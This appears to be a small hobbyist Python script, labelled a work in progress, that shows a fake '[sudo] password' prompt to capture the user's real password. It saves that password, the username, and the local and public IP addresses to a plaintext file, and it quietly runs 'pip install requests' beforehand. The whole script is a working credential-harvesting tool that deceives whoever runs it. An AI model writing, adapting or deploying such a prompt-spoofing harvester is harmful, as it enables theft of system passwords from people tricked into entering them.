# WORK IN PROGRESS, PROJECT MADE BY untitled-guy


import getpass
import os
import socket
os.system("pip install requests")
os.system("clear")
import requests

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def get_public_ip():
    response = requests.get('https://api.ipify.org')
    response.raise_for_status()  
    return response.text

def get_user_info():
    username = getpass.getuser()
    password = getpass.getpass(f"[sudo] password for {username}: ")
    os.system("clear")
    return username, password

def write_info_to_file(username, password, local_ip, public_ip):
    with open(f"{username}_info.txt", "w") as f:
        f.write(f"local ip address: {local_ip}\n")
        f.write(f"public ip address: {public_ip}\n")
        f.write(f"username: {username}\n")
        f.write(f"sudo password: {password}\n")

def main():
    username, password = get_user_info()
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    write_info_to_file(username, password, local_ip, public_ip)

if __name__ == "__main__":
    main()